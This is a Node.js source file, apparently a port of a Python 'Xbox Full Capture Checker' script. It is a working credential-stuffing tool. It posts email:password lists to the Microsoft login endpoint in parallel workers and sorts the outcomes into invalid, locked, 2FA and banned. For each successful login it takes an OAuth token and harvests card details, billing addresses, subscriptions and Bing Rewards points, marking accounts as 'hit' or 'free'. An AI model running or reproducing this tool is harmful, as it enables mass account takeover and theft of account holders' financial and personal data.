// ============================================================
//  Xbox Full Capture Checker — Node.js port of backup.py
//  Direct HTTP requests, no proxies
// ============================================================

function parseLR(text, left, right) {
  const escaped = left.replace(/[.*+?^${}()|[\]\\]/g, "\\$&");
  const escapedR = right.replace(/[.*+?^${}()|[\]\\]/g, "\\$&");
  const match = new RegExp(`${escaped}(.*?)${escapedR}`, "s").exec(text);
  return match ? match[1] : "";
}

function checkFirstRequestStatus(text, finalUrl, cookieStr) {
  if (
    text.includes("Your account or password is incorrect.") ||
    text.includes("That Microsoft account doesn\\'t exist.") ||
    text.includes("Sign in to your Microsoft account") ||
    text.includes("timed out")
  ) return "FAILURE";

  if (text.includes(",AC:null,urlFedConvertRename")) return "BAN";

  if (
    text.includes("account.live.com/recover?mkt") ||
    text.includes("recover?mkt") ||
    text.includes("account.live.com/identity/confirm?mkt") ||
    text.includes("Email/Confirm?mkt")
  ) return "2FACTOR";

  if (text.includes("/cancel?mkt=") || text.includes("/Abuse?mkt="))
    return "CUSTOM_LOCK";

  if (
    (cookieStr.includes("ANON") || cookieStr.includes("WLSSC")) &&
    finalUrl.includes("https://login.live.com/oauth20_desktop.srf?")
  ) return "SUCCESS";

  return "UNKNOWN_FAILURE";
}

const LOGIN_URL =
  "https://login.live.com/ppsecure/post.srf?client_id=0000000048170EF2&redirect_uri=https%3A%2F%2Flogin.live.com%2Foauth20_desktop.srf&response_type=token&scope=service%3A%3Aoutlook.office.com%3A%3AMBI_SSL&display=touch&username=ashleypetty%40outlook.com&contextid=2CCDB02DC526CA71&bk=1665024852&uaid=a5b22c26bc704002ac309462e8d061bb&pid=15216";

const LOGIN_HEADERS = {
  Host: "login.live.com",
  Connection: "keep-alive",
  "Cache-Control": "max-age=0",
  "sec-ch-ua": '"Microsoft Edge";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
  "sec-ch-ua-mobile": "?0",
  "sec-ch-ua-platform": '"Windows"',
  "Upgrade-Insecure-Requests": "1",
  Origin: "https://login.live.com",
  "Content-Type": "application/x-www-form-urlencoded",
  "User-Agent":
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0.0",
  Accept:
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
  "Sec-Fetch-Site": "same-origin",
  "Sec-Fetch-Mode": "navigate",
  "Sec-Fetch-User": "?1",
  "Sec-Fetch-Dest": "document",
  Referer:
    "https://login.live.com/oauth20_authorize.srf?client_id=0000000048170EF2&redirect_uri=https%3A%2F%2Flogin.live.com%2Foauth20_desktop.srf&response_type=token&scope=service%3A%3Aoutlook.office.com%3A%3AMBI_SSL&uaid=a5b22c26bc704002ac309462e8d061bb&display=touch&username=ashleypetty%40outlook.com",
  "Accept-Language": "en-US,en;q=0.9",
  "Accept-Encoding": "gzip, deflate",
};

const STATIC_COOKIE =
  'MSPRequ=id=N&lt=1716398680&co=1; uaid=a5b22c26bc704002ac309462e8d061bb; MSPOK=$uuid-175ae920-bd12-4d7c-ad6d-9b92a6818f89';

/**
 * Manual redirect-following fetch that collects cookies like Python requests.Session
 */
class SessionFetch {
  constructor() {
    this.cookies = new Map();
    // Seed with static cookies from the original script
    for (const part of STATIC_COOKIE.split("; ")) {
      const eq = part.indexOf("=");
      if (eq > 0) this.cookies.set(part.substring(0, eq), part.substring(eq + 1));
    }
  }

  _extractCookies(headers) {
    const raw = headers.getSetCookie?.();
    if (raw && Array.isArray(raw)) {
      for (const c of raw) {
        const main = c.split(";")[0].trim();
        const eq = main.indexOf("=");
        if (eq > 0) {
          this.cookies.set(main.substring(0, eq).trim(), main.substring(eq + 1).trim());
        }
      }
    }
  }

  cookieString() {
    return Array.from(this.cookies.entries()).map(([k, v]) => `${k}=${v}`).join("; ");
  }

  cookieDict() {
    return Object.fromEntries(this.cookies);
  }

  async fetch(url, options = {}) {
    const maxRedirects = 10;
    let currentUrl = url;
    let method = options.method || "GET";
    let body = options.body;
    let lastResponse;

    for (let i = 0; i < maxRedirects; i++) {
      const headers = { ...(options.headers || {}), Cookie: this.cookieString() };
      const res = await fetch(currentUrl, {
        method,
        headers,
        body,
        redirect: "manual",
        signal: options.signal,
      });
      this._extractCookies(res.headers);
      lastResponse = res;

      const location = res.headers.get("location");
      if (res.status >= 300 && res.status < 400 && location) {
        currentUrl = location.startsWith("http") ? location : new URL(location, currentUrl).href;
        method = "GET";
        body = undefined;
        continue;
      }

      const text = await res.text();
      return { text, url: currentUrl, status: res.status };
    }
    throw new Error("Too many redirects");
  }
}

/**
 * Check a single account — exact port of backup.py's check_account
 */
async function checkAccount(credential, signal) {
  const parts = credential.split(":");
  if (parts.length < 2) {
    return { status: "fail", user: credential, password: "", detail: "Incorrect format" };
  }
  const user = parts[0];
  const password = parts.slice(1).join(":");

  const session = new SessionFetch();

  try {
    // Block 1: Login POST
    const loginBody =
      `ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpgrequestid=` +
      `&PPFT=-Dim7vMfzjynvFHsYUX3COk7z2NZzCSnDj42yEbbf18uNb%21Gl%21I9kGKmv895GTY7Ilpr2XXnnVtOSLIiqU%21RssMLamTzQEfbiJbXxrOD4nPZ4vTDo8s*CJdw6MoHmVuCcuCyH1kBvpgtCLUcPsDdx09kFqsWFDy9co%21nwbCVhXJ*sjt8rZhAAUbA2nA7Z%21GK5uQ%24%24` +
      `&PPSX=PassportRN&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=1` +
      `&isSignupPost=0&isRecoveryAttemptPost=0&i13=1` +
      `&login=${encodeURIComponent(user)}&loginfmt=${encodeURIComponent(user)}&type=11&LoginOptions=1` +
      `&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd=${encodeURIComponent(password)}`;

    const r1 = await session.fetch(LOGIN_URL, {
      method: "POST",
      headers: LOGIN_HEADERS,
      body: loginBody,
      signal,
    });

    // Block 2: Key check
    const status = checkFirstRequestStatus(r1.text, r1.url, session.cookieString());

    if (status !== "SUCCESS") {
      const labels = {
        FAILURE: { s: "fail", d: "Invalid Credentials" },
        UNKNOWN_FAILURE: { s: "fail", d: "Unknown Failure" },
        BAN: { s: "locked", d: "Banned" },
        "2FACTOR": { s: "locked", d: "2FA/Verify" },
        CUSTOM_LOCK: { s: "locked", d: "Custom Lock (Abuse/Cancel)" },
      };
      const l = labels[status] || { s: "fail", d: status };
      return { status: l.s, user, password, detail: l.d };
    }

    // Block 3: OAuth token request
    const oauthUrl =
      "https://login.live.com/oauth20_authorize.srf?client_id=000000000004773A&response_type=token&scope=PIFD.Read+PIFD.Create+PIFD.Update+PIFD.Delete&redirect_uri=https%3A%2F%2Faccount.microsoft.com%2Fauth%2Fcomplete-silent-delegate-auth&state=%7B%22userId%22%3A%22bf3383c9b44aa8c9%22%2C%22scopeSet%22%3A%22pidl%22%7D&prompt=none";
    const r2 = await session.fetch(oauthUrl, {
      method: "GET",
      headers: {
        Host: "login.live.com",
        "User-Agent":
          "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0",
        Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        Connection: "close",
        Referer: "https://account.microsoft.com/",
      },
      signal,
    });

    // Block 4: Extract token
    const token = decodeURIComponent(parseLR(r2.url, "access_token=", "&token_type"));
    if (!token) {
      return { status: "locked", user, password, detail: "Token Parse Fail" };
    }

    // Block 5: Payment info
    const payHeaders = {
      "User-Agent":
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.96 Safari/537.36",
      Pragma: "no-cache",
      Accept: "application/json",
      "Accept-Language": "en-US,en;q=0.9",
      Authorization: `MSADELEGATE1.0="${token}"`,
      "Content-Type": "application/json",
      Origin: "https://account.microsoft.com",
      Referer: "https://account.microsoft.com/",
      "Sec-Fetch-Dest": "empty",
      "Sec-Fetch-Mode": "cors",
      "Sec-Fetch-Site": "same-site",
    };

    const r3 = await session.fetch(
      "https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentInstrumentsEx?status=active,removed&language=en-US",
      { method: "GET", headers: payHeaders, signal }
    );
    const src3 = r3.text;

    const balance = parseLR(src3, 'balance":', ',"') || "N/A";
    const cardHolder = parseLR(src3, 'paymentMethodFamily":"credit_card","display":{"name":"', '"') || "N/A";
    const accountHolderName = parseLR(src3, 'accountHolderName":"', '","') || "N/A";
    const zipcode = parseLR(src3, '"postal_code":"', '",') || "N/A";
    const region = parseLR(src3, '"region":"', '",') || "N/A";
    const address1 = parseLR(src3, '{"address_line1":"', '",') || "N/A";
    const city = parseLR(src3, '"city":"', '",') || "N/A";

    // Block 9: Subscription check
    const r5 = await session.fetch(
      "https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentTransactions",
      { method: "GET", headers: payHeaders, signal }
    );
    const src5 = r5.text;

    const country = parseLR(src5, 'country":"', '"}') || "N/A";
    const subscription = parseLR(src5, 'title":"', '",') || "N/A";
    const quantity = parseLR(src5, 'quantity":', ',"') || "N/A";
    const description = parseLR(src5, 'description":"', '",') || "N/A";
    const amount = parseLR(src5, 'totalAmount":', ',"') || "N/A";
    const ctpid = parseLR(src5, '"subscriptionId":"ctp:', '"') || "N/A";
    const item1 = parseLR(src5, '"title":"', '"') || "N/A";

    let autoRenew = "N/A";
    if (ctpid !== "N/A") {
      autoRenew = parseLR(src5, `{"subscriptionId":"ctp:${ctpid}","autoRenew":`, ",") || "N/A";
    }

    const startDate = parseLR(src5, '"startDate":"', "T") || "N/A";
    const nextRenewalDate = parseLR(src5, '"nextRenewalDate":"', "T") || "N/A";
    const descriptionSub2 = parseLR(src5, '"description":"', '"') || "N/A";
    const productType = parseLR(src5, '"productType":"', '"') || "N/A";
    const quantitySub2 = parseLR(src5, '"quantity":', ",") || "N/A";
    const currency = parseLR(src5, '"currency":"', '"') || "";
    const totalAmount = parseLR(src5, '"totalAmount":', ",") || "N/A";

    // Block 10-11: Bing rewards points
    let points = "0";
    try {
      const r4 = await session.fetch("https://rewards.bing.com/", {
        method: "GET",
        headers: {
          "User-Agent":
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
          Pragma: "no-cache",
          Accept: "*/*",
        },
        signal,
      });
      points = parseLR(r4.text, ',"availablePoints":', ',"') || "0";
    } catch {
      // Points fetch is optional
    }

    // Build captures
    const captures = {
      Address: `[ Address: ${address1}, City: ${city}, State: ${region}, Postalcode: ${zipcode} ]`,
      Points: points,
      "CC-Cap": `[Country: ${country} | CardHolder: ${accountHolderName} | CC: ${cardHolder} | CC Funding: $${balance} ]`,
      "Subscription-1": `[ Purchased Item: ${item1} | Auto Renew: ${autoRenew} | startDate: ${startDate} | Next Billing: ${nextRenewalDate} ]`,
      "Subscription-2": `[ Product: ${descriptionSub2} | Total Purchase: ${quantitySub2} | Avaliable Points: ${points} | Total Price: ${totalAmount}${currency} ]`,
    };

    // Determine active vs expired
    let isActive = false;
    if (subscription && subscription !== "N/A" && nextRenewalDate && nextRenewalDate !== "N/A") {
      try {
        const renewal = new Date(nextRenewalDate);
        if (renewal >= new Date()) isActive = true;
      } catch {}
    }

    return {
      status: isActive ? "hit" : "free",
      user,
      password,
      captures,
      subscription,
      nextRenewalDate,
      points,
      cardHolder,
    };
  } catch (err) {
    if (err.name === "AbortError") throw err;
    return { status: "retry", user, password, detail: `Connection Error: ${err.message}` };
  }
}

/**
 * Check multiple accounts with worker pool
 */
async function checkAccounts(credentials, threads = 15, onProgress, signal) {
  const results = new Array(credentials.length);
  let currentIndex = 0;
  let completed = 0;

  async function worker() {
    while (true) {
      if (signal?.aborted) break;
      const idx = currentIndex++;
      if (idx >= credentials.length) break;
      try {
        results[idx] = await checkAccount(credentials[idx], signal);
      } catch (err) {
        if (err.name === "AbortError") break;
        results[idx] = { status: "retry", user: credentials[idx], password: "", detail: String(err) };
      }
      completed++;
      if (onProgress) onProgress(completed, credentials.length);
    }
  }

  const workers = Array(Math.min(threads, credentials.length)).fill(null).map(() => worker());
  await Promise.all(workers);
  return results.filter(Boolean);
}

module.exports = { checkAccount, checkAccounts, parseLR };
